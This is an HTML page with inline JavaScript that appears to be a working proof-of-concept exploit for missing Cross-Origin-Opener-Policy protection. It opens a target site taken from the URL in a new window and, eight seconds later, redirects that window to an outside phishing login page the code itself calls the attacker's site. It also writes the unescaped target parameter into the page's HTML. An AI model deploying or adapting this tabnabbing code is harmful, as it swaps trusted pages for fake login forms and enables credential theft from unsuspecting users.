<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>COOP Exploitation</title>
        <style>
            body {
                background-color: white;
                width: 100%;
                height: 100vh;
                margin: 0;
                display: flex;
                flex-direction: column;
                justify-content: center;
                align-items: center;
                text-align: center;
                font-family: Arial, sans-serif;
            }
            .loader {
                border: 4px solid rgba(0, 0, 0, 0.1);
                border-left-color: #007bff;
                border-radius: 50%;
                width: 40px;
                height: 40px;
                animation: spin 1s linear infinite;
            }
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
            .redirect-container {
                background: white;
                padding: 20px 30px;
                border-radius: 8px;
                box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.15);
                width: 400px;
                text-align: center;
            }
            .message {
                margin-top: 15px;
                font-size: 18px;
                color: #333;
            }
            .secondary-message {
                margin-top: 15px;
                font-size: 14px;
                color: #666;
            }
            .manual-link {
                color: #007bff;
                text-decoration: none;
                font-weight: bold;
            }
        </style>
        <script type="text/javascript">
            let foo; // Declare globally

            function isValidUrl(url) {
                // Basic validation for the URL to prevent malicious redirects
                const pattern = /^(https?:\/\/)[\w\-]+\.[\w\-]+(?:\.[a-z]{2,})?/;
                return pattern.test(url);
            }
    
            function tParam(qParam) {
                const frmURL = window.location.search.substring(1);
                const varURL = frmURL.split('&');
                for (let i = 0; i < varURL.length; i++) {
                    const vParam = varURL[i].split('=');
                    if (vParam[0] === qParam) {
                        return decodeURIComponent(vParam[1]);
                    }
                }
                console.warn("Target parameter missing. Redirecting...");
                return null;
            }
            
            function init() {
                if (foo) {
                    console.log("Redirecting to the attacker's controlled site");
                    foo.location.href = "https://sp3ttr0.github.io/COOP-Exploit/login.html";
                } else {
                    console.error("Window object not found, redirection failed.");
                }
            }
            
            function launch() {
                const target = tParam("target");
                if (!target || !isValidUrl(target)) {
                    console.error("Invalid or missing target URL. Redirection will not happen.");
                    return;
                }
                foo = window.open(target, "_blank");
                if (foo) {
                    console.log("Target site opened successfully:", target);
                    setTimeout(init, 8000);
                } else {
                    console.error("Popup blocked or failed to open.");
                    displayErrorMessage();
                }
            }

            function displayErrorMessage() {
                const message = document.createElement('div');
                message.id = 'error-message';
                message.innerHTML = `
                    <p>Popup blocked or redirection failed. Try clicking below:</p>
                    <a class="manual-link" href="${tParam('target')}" target="_blank">Click here to visit the target</a>
                `;
                document.body.appendChild(message);
            }

            function setup() {
                const target = tParam("target");
                if (!target) {
                    console.error("Target parameter is missing.");
                    return;
                }
                launch();
                document.body.addEventListener('click', launch);
                const message = document.createElement('div');
                message.id = 'message';
                message.innerText = `If the site did not automatically redirect to ${target}, click anywhere on the white background.`;
                document.body.appendChild(message);
                launch();
            }
            
            window.onload = setup;
        </script>
    </head>
